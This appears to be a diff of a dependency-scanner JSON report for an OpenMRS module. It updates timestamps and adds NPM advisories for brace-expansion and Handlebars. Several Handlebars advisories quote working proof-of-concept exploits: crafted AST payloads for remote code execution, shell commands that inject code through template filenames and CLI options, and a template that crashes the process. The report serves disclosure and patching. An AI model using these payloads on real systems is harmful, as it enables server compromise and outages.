@@ -1,23 +1,23 @@
 {
     "reportSchema": "1.1",
     "scanInfo": {
-        "engineVersion": "12.2.0",
+        "engineVersion": "12.2.1",
         "dataSource": [
 {
                 "name": "NVD API Last Checked",
-                "timestamp": "2026-03-18T12:04:12Z"
+                "timestamp": "2026-04-13T12:40:14Z"
             }
 ,{
                 "name": "NVD API Last Modified",
-                "timestamp": "2026-03-18T11:16:16Z"
+                "timestamp": "2026-04-13T11:38:48Z"
             }
 ,{
                 "name": "NVD Cache Last Checked",
-                "timestamp": "2026-03-18T12:04:12Z"
+                "timestamp": "2026-04-13T12:40:14Z"
             }
 ,{
                 "name": "NVD Cache Last Modified",
-                "timestamp": "2026-03-18T11:16:16Z"
+                "timestamp": "2026-04-13T11:38:48Z"
             }
         ]
 
@@ -25,7 +25,7 @@
     },
     "projectInfo": {
         "name": "openmrs-module-patientflags",
-        "reportDate": "2026-03-19T09:40:33.872933021Z",
+        "reportDate": "2026-04-13T21:40:02.067948772Z",
         "credits": {
             "NVD": "This product uses the NVD API but is not endorsed or certified by the NVD. This report contains data retrieved from the National Vulnerability Database: https://nvd.nist.gov",
             "CISA": "This report may contain data retrieved from the CISA Known Exploited Vulnerability Catalog: https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
@@ -1438,6 +1438,58 @@
             ]
             ,"vulnerabilities": [
  {
+                "source": "NPM",
+                "name": "GHSA-f886-m6hf-6m8v",
+"unscored": "true", "severity" : "moderate",
+                    "cvssv3": {
+                        "baseScore": 6.5
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "REQUIRED"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "NONE"
+                        ,"integrityImpact": "NONE"
+                        ,"availabilityImpact": "HIGH"
+                        ,"baseSeverity": "MEDIUM"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-400"                    ],
+                "description": "### Impact\n\nA brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.\n\nThe loop in question:\n\nhttps:\/\/github.com\/juliangruber\/brace-expansion\/blob\/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a\/src\/index.ts#L184\n\n`test()` is one of\n\nhttps:\/\/github.com\/juliangruber\/brace-expansion\/blob\/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a\/src\/index.ts#L107-L113\n\nThe increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.\n\nThis affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch\/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.\n\n### Patches\n\n\nUpgrade to versions\n- 5.0.5+\n\nA step increment of 0 is now sanitized to 1, which matches bash behavior.\n\n### Workarounds\n\nSanitize strings passed to `expand()` to ensure a step value of `0` is not used.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/security\/advisories\/GHSA-f886-m6hf-6m8v","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/security\/advisories\/GHSA-f886-m6hf-6m8v"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33750","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33750"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/pull\/96","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/pull\/96"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/blob\/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a\/src\/index.ts#L184","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/blob\/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a\/src\/index.ts#L184"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/commit\/7fd684f89fdde3549563d0a6522226a9189472a2","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/commit\/7fd684f89fdde3549563d0a6522226a9189472a2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/pull\/95","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/pull\/95"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/blob\/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a\/src\/index.ts#L107-L113","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/blob\/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a\/src\/index.ts#L107-L113"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/issues\/98","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/issues\/98"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/pull\/97","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/pull\/97"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/commit\/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/commit\/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-f886-m6hf-6m8v","name": "https:\/\/github.com\/advisories\/GHSA-f886-m6hf-6m8v"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/juliangruber\/brace-expansion\/commit\/311ac0d54994158c0a384e286a7d6cbb17ee8ed5","name": "https:\/\/github.com\/juliangruber\/brace-expansion\/commit\/311ac0d54994158c0a384e286a7d6cbb17ee8ed5"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:brace-expansion:\\<1.1.13:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
                 "source": "NPM",
                 "name": "GHSA-v6h2-p8h4-qcjw",
 "unscored": "true", "severity" : "low",
@@ -3208,6 +3260,44 @@
             ,"vulnerabilities": [
  {
                 "source": "NPM",
+                "name": "GHSA-2w6w-674q-4c4q",
+"unscored": "true", "severity" : "critical",
+                    "cvssv3": {
+                        "baseScore": 9.800000190734863
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "HIGH"
+                        ,"availabilityImpact": "HIGH"
+                        ,"baseSeverity": "CRITICAL"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-843",                        "CWE-94"                    ],
+                "description": "## Summary\n\n`Handlebars.compile()` accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to `compile()` can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`Handlebars.compile()` accepts either a template string or a pre-parsed AST. When an AST is supplied, the JavaScript code generator in `lib\/handlebars\/compiler\/javascript-compiler.js` emits `NumberLiteral` values verbatim:\n\n```javascript\n\/\/ Simplified representation of the vulnerable code path:\n\/\/ NumberLiteral.value is appended to the generated code without escaping\ncompiledCode += numberLiteralNode.value;\n```\n\nBecause the value is not wrapped in quotes or otherwise sanitized, passing a string such as `{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() \/\/` as the `value` of a `NumberLiteral` causes the generated `eval`-ed code to break out of its intended context and execute arbitrary commands.\n\nAny endpoint that deserializes user-controlled JSON and passes the result directly to `Handlebars.compile()` is exploitable.\n\n## Proof of Concept\n\nServer-side Express application that passes `req.body.text` to `Handlebars.compile()`:\n\n\n```Javascript\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"\/api\/render\", (req, res) => {\n  let text = req.body.text;\n  let template = Handlebars.compile(text);\n  let result = template();\n  res.send(result);\n});\n\napp.listen(2123);\n```\n\n```\nPOST \/api\/render HTTP\/1.1\nContent-Type: application\/json\nHost: 127.0.0.1:2123\n\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"body\": [\n      {\n        \"type\": \"MustacheStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\",\n          \"data\": false,\n          \"depth\": 0,\n          \"parts\": [\"lookup\"],\n          \"original\": \"lookup\",\n          \"loc\": null\n        },\n        \"params\": [\n          {\n            \"type\": \"PathExpression\",\n            \"data\": false,\n            \"depth\": 0,\n            \"parts\": [],\n            \"original\": \"this\",\n            \"loc\": null\n          },\n          {\n            \"type\": \"NumberLiteral\",\n            \"value\": \"{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() \/\/\",\n            \"original\": 1,\n            \"loc\": null\n          }\n        ],\n        \"escaped\": true,\n        \"strip\": { \"open\": false, \"close\": false },\n        \"loc\": null\n      }\n    ]\n  }\n}\n```\n\nThe response body will contain the output of the `id` command executed on the server.\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars\/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-2w6w-674q-4c4q","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-2w6w-674q-4c4q"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-2w6w-674q-4c4q","name": "https:\/\/github.com\/advisories\/GHSA-2w6w-674q-4c4q"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33937","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33937"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:handlebars:\\>\\=4.0.0\\<\\=4.7.8:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
                 "name": "GHSA-765h-qjxv-5f44",
 "unscored": "true", "severity" : "critical",
                     "cvssv3": {
@@ -3352,6 +3442,44 @@
                     }                ]
                 }, {
                 "source": "NPM",
+                "name": "GHSA-xjpj-3mr7-gcpf",
+"unscored": "true", "severity" : "high",
+                    "cvssv3": {
+                        "baseScore": 8.300000190734863
+                        ,"attackVector": "LOCAL"
+                        ,"attackComplexity": "LOW"
+                        ,"privilegesRequired": "LOW"
+                        ,"userInteraction": "REQUIRED"
+                        ,"scope": "CHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "HIGH"
+                        ,"availabilityImpact": "HIGH"
+                        ,"baseSeverity": "HIGH"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-79",                        "CWE-116",                        "CWE-94"                    ],
+                "description": "## Summary\n\nThe Handlebars CLI precompiler (`bin\/handlebars` \/ `lib\/precompiler.js`) concatenates user-controlled strings \u2014 template file names and several CLI options \u2014 directly into the JavaScript it emits, without any escaping or sanitization. An attacker who can influence template filenames or CLI arguments can inject arbitrary JavaScript that executes when the generated bundle is loaded in Node.js or a browser.\n\n## Description\n\n`lib\/precompiler.js` generates JavaScript source by string-interpolating several values directly into the output. Four distinct injection points exist:\n\n### 1. Template name injection\n\n```javascript\n\/\/ Vulnerable code pattern\noutput += 'templates[\"' + template.name + '\"] = template(...)';\n```\n\n`template.name` is derived from the file system path. A filename containing `\"` or `'];` breaks out of the string literal and injects arbitrary JavaScript.\n\n### 2. Namespace injection (`-n` \/ `--namespace`)\n\n```javascript\n\/\/ Vulnerable code pattern\noutput += 'var templates = ' + opts.namespace + ' = ' + opts.namespace + ' || {};';\n```\n\n`opts.namespace` is emitted as raw JavaScript. Anything after a `;` in the value becomes an additional JavaScript statement.\n\n### 3. CommonJS path injection (`-c` \/ `--commonjs`)\n\n```javascript\n\/\/ Vulnerable code pattern\noutput += 'var Handlebars = require(\"' + opts.commonjs + '\");';\n```\n\n`opts.commonjs` is interpolated inside double quotes with no escaping, allowing `\"` to close the string and inject further code.\n\n### 4. AMD path injection (`-h` \/ `--handlebarPath`)\n\n```javascript\n\/\/ Vulnerable code pattern\noutput += \"define(['\" + opts.handlebarPath + \"handlebars.runtime'], ...)\";\n```\n\n`opts.handlebarPath` is interpolated inside single quotes, allowing `'` to close the array element.\n\nAll four injection points result in code that executes when the generated bundle is `require()`d or loaded in a browser.\n\n## Proof of Concept\n\n**Template name vector (creates a file `pwned` on disk):**\n\n```bash\nmkdir -p templates\nprintf 'Hello' > \"templates\/evil'] = (function(){require(\\\"fs\\\").writeFileSync(\\\"pwned\\\",\\\"1\\\")})(); \/\/.handlebars\"\n\nnode bin\/handlebars templates -o out.js\nnode -e 'require(\".\/out.js\")'  # Executes injected code, creates .\/pwned\n```\n\n**Namespace vector:**\n\n```bash\nnode bin\/handlebars templates -o out.js \\\n  -n \"App.ns; require('fs').writeFileSync('pwned2','1'); \/\/\"\nnode -e 'require(\".\/out.js\")'\n```\n\n**CommonJS vector:**\n\n```bash\nnode bin\/handlebars templates -o out.js \\\n  -c 'handlebars\"); require(\"fs\").writeFileSync(\"pwned3\",\"1\"); \/\/'\nnode -e 'require(\".\/out.js\")'\n```\n\n**AMD vector:**\n\n```bash\nnode bin\/handlebars templates -o out.js -a \\\n  -h \"'); require('fs').writeFileSync('pwned4','1'); \/\/ \"\nnode -e 'require(\".\/out.js\")'\n```\n\n## Workarounds\n\n- **Validate all CLI inputs** before invoking the precompiler. Reject filenames and option values  that contain characters with JavaScript string-escaping significance (`\"`, `'`, `;`, etc.).\n- **Use a fixed, trusted namespace string** passed via a configuration file rather than  command-line arguments in automated pipelines.\n- **Run the precompiler in a sandboxed environment** (container with no write access to sensitive  paths) to limit the impact of successful exploitation.\n- **Audit template filenames** in any repository or package that is consumed by an automated  build pipeline.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-xjpj-3mr7-gcpf","name": "https:\/\/github.com\/advisories\/GHSA-xjpj-3mr7-gcpf"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33941","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33941"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-xjpj-3mr7-gcpf","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-xjpj-3mr7-gcpf"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:handlebars:\\>\\=4.0.0\\<\\=4.7.8:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
                 "name": "GHSA-3cqr-58rm-57f8",
 "unscored": "true", "severity" : "high",
                     "cvssv3": {
@@ -3396,6 +3524,82 @@
                     }                ]
                 }, {
                 "source": "NPM",
+                "name": "GHSA-3mfm-83xf-c92r",
+"unscored": "true", "severity" : "high",
+                    "cvssv3": {
+                        "baseScore": 8.100000381469727
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "HIGH"
+                        ,"availabilityImpact": "HIGH"
+                        ,"baseSeverity": "HIGH"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-843",                        "CWE-94"                    ],
+                "description": "## Summary\n\nThe `@partial-block` special variable is stored in the template data context and is reachable and mutable from within a template via helpers that accept arbitrary objects. When a helper overwrites `@partial-block` with a crafted Handlebars AST, a subsequent invocation of `{{> @partial-block}}` compiles and executes that AST, enabling arbitrary JavaScript execution on the server.\n\n## Description\n\nHandlebars stores `@partial-block` in the `data` frame that is accessible to templates. In nested contexts, a parent frame's `@partial-block` is reachable as `@_parent.partial-block`. Because the data frame is a mutable object, any registered helper that accepts an object reference and assigns properties to it can overwrite `@partial-block` with an attacker-controlled value.\n\nWhen `{{> @partial-block}}` is subsequently evaluated, `invokePartial` receives the crafted object. The runtime, finding an object that is not a compiled function, falls back to **dynamically compiling** the value via `env.compile()`. If that value is a well-formed Handlebars AST containing injected code, the injected JavaScript runs in the server process.\n\nThe `handlebars-helpers` npm package (commonly used with Handlebars) includes several helpers such as `merge` that can be used as the mutation primitive.\n\n## Proof of Concept\n\nTested with Handlebars 4.7.8 and `handlebars-helpers`:\n\n```javascript\nconst Handlebars = require('handlebars');\nconst merge = require('handlebars-helpers').object().merge;\nHandlebars.registerHelper('merge', merge);\n\nconst vulnerableTemplate = `\n{{#*inline \"myPartial\"}}\n    {{>@partial-block}}\n    {{>@partial-block}}\n{{\/inline}}\n{{#>myPartial}}\n    {{merge @_parent partial-block=1}}\n    {{merge @_parent partial-block=payload}}\n{{\/myPartial}}\n`;\n\nconst maliciousContext = {\n  payload: {\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          \/\/ Code injected via depth field \u2014 breaks out of generated function call\n          depth: \"0])),function () {console.error('VULNERABLE: RCE via @partial-block');}()));\/\/\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n\/\/ Prints: VULNERABLE: RCE via @partial-block\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars\/runtime')`). The `compile()` method is  absent, eliminating the vulnerable fallback path.\n- **Audit registered helpers** for any that write arbitrary values to context objects. Helpers  should treat context data as read-only.\n- **Avoid registering helpers** from third-party packages (such as `handlebars-helpers`) in  contexts where templates or context data can be influenced by untrusted input.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-3mfm-83xf-c92r","name": "https:\/\/github.com\/advisories\/GHSA-3mfm-83xf-c92r"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-3mfm-83xf-c92r","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-3mfm-83xf-c92r"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33938","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33938"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:handlebars:\\>\\=4.0.0\\<\\=4.7.8:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
+                "name": "GHSA-xhpv-hc6g-r9c6",
+"unscored": "true", "severity" : "high",
+                    "cvssv3": {
+                        "baseScore": 8.100000381469727
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "HIGH"
+                        ,"availabilityImpact": "HIGH"
+                        ,"baseSeverity": "HIGH"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-843",                        "CWE-94"                    ],
+                "description": "## Summary\n\nA crafted object placed in the template context can bypass all conditional guards in `resolvePartial()` and cause `invokePartial()` to return `undefined`. The Handlebars runtime then treats the unresolved partial as a source that needs to be compiled, passing the crafted object to `env.compile()`. Because the object is a valid Handlebars AST containing injected code, the generated JavaScript executes arbitrary commands on the server. The attack requires the adversary to control a value that can be returned by a dynamic partial lookup.\n\n## Description\n\nThe vulnerable code path spans two functions in `lib\/handlebars\/runtime.js`:\n\n**`resolvePartial()`:** A crafted object with `call: true` satisfies the first branch condition (`partial.call`) and causes an early return of the original object itself, because none of the remaining conditionals (string check, `options.partials` lookup, etc.) match a plain object. The function returns the crafted object as-is.\n\n**`invokePartial()`:** When `resolvePartial` returns a non-function object, `invokePartial` produces `undefined`. The runtime interprets `undefined` as \"partial not yet compiled\" and calls `env.compile(partial, ...)` where `partial` is the crafted AST object. The JavaScript code generator processes the AST and emits JavaScript containing the injected payload, which is then evaluated.\n\n**Minimum prerequisites:**\n1. The template uses a dynamic partial lookup: `{{> (lookup . \"key\")}}` or equivalent.\n2. The adversary can set the value of the looked-up context property to a crafted object.\n\nIn server-side rendering scenarios where templates process user-supplied context data, this enables full Remote Code Execution.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars');\n\nconst vulnerableTemplate = `{{> (lookup . \"payload\")}}`;\n\nconst maliciousContext = {\n  payload: {\n    call: true, \/\/ bypasses the primary resolvePartial branch\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          \/\/ Injected code breaks out of the generated function's argument list\n          depth: \"0])),function () {console.error('VULNERABLE: object -> dynamic partial -> RCE');}()));\/\/\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n\/\/ Prints: VULNERABLE: object -> dynamic partial -> RCE\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars\/runtime')`). Without `compile()`,  the fallback compilation path in `invokePartial` is unreachable.\n- **Sanitize context data** before rendering: ensure no value in the context is a non-primitive  object that could be passed to a dynamic partial.\n- **Avoid dynamic partial lookups** (`{{> (lookup ...)}}`) when context data is user-controlled.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-xhpv-hc6g-r9c6","name": "https:\/\/github.com\/advisories\/GHSA-xhpv-hc6g-r9c6"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33940","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33940"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-xhpv-hc6g-r9c6","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-xhpv-hc6g-r9c6"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:handlebars:\\>\\=4.0.0\\<\\=4.7.8:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
                 "name": "GHSA-62gr-4qp9-h98f",
 "unscored": "true", "severity" : "high",
                     "cvssv3": {
@@ -3432,6 +3636,44 @@
  {
                         "software": { 
                             "id":"cpe:2.3:a:*:handlebars:\\>\\=4.0.0\\<4.4.5:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
+                "name": "GHSA-9cx6-37pm-9jff",
+"unscored": "true", "severity" : "high",
+                    "cvssv3": {
+                        "baseScore": 7.5
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "NONE"
+                        ,"integrityImpact": "NONE"
+                        ,"availabilityImpact": "HIGH"
+                        ,"baseSeverity": "HIGH"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-754"                    ],
+                "description": "## Summary\n\nWhen a Handlebars template contains decorator syntax referencing an unregistered decorator (e.g. `{{*n}}`), the compiled template calls `lookupProperty(decorators, \"n\")`, which returns `undefined`. The runtime then immediately invokes the result as a function, causing an unhandled `TypeError: ... is not a function` that crashes the Node.js process. Any application that compiles user-supplied templates without wrapping the call in a `try\/catch` is vulnerable to a single-request Denial of Service.\n\n## Description\n\nIn `lib\/handlebars\/compiler\/javascript-compiler.js`, the code generated for a decorator invocation looks like:\n\n```javascript\nfn = lookupProperty(decorators, \"n\")(fn, props, container, options) || fn;\n```\n\nWhen `\"n\"` is not a registered decorator, `lookupProperty(decorators, \"n\")` returns `undefined`. The expression immediately attempts to call `undefined` as a function, producing:\n\n```\nTypeError: lookupProperty(...) is not a function\n```\n\nBecause the error is thrown inside the compiled template function and is not caught by the runtime, it propagates up as an unhandled exception and \u2014 when not caught by the application \u2014 crashes the Node.js process.\n\nThis inconsistency is notable: references to unregistered **helpers** produce a clean `\"Missing helper: ...\"` error, while references to unregistered **decorators** cause a hard crash.\n\n**Attack scenario:** An attacker submits `{{*n}}` as template content to any endpoint that calls `Handlebars.compile(userInput)()`. Each request crashes the server process; with process managers that auto-restart (PM2, systemd), repeated submissions create a persistent DoS.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars'); \/\/ Handlebars 4.7.8, Node.js v22.x\n\n\/\/ Any of these payloads crash the process\nHandlebars.compile('{{*n}}')({});\nHandlebars.compile('{{*decorator}}')({});\nHandlebars.compile('{{*constructor}}')({});\n```\n\nExpected crash output:\n```\nTypeError: lookupProperty(...) is not a function\n    at Function.eval [as decorator] (eval at compile (...javascript-compiler.js:134:36))\n```\n\n## Workarounds\n\n- **Wrap compilation and rendering in `try\/catch`:**\n  ```javascript\n  try {\n    const result = Handlebars.compile(userInput)(context);\n    res.send(result);\n  } catch (err) {\n    res.status(400).send('Invalid template');\n  }\n  ```\n- **Validate template input** before passing it to `compile()`. Reject templates containing  decorator syntax (`{{*...}}`) if decorators are not used in your application.\n- **Use the pre-compilation workflow:** compile templates at build time and serve only pre-compiled  templates; do not call `compile()` at request time.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-9cx6-37pm-9jff","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-9cx6-37pm-9jff"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33939","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33939"                    }, {
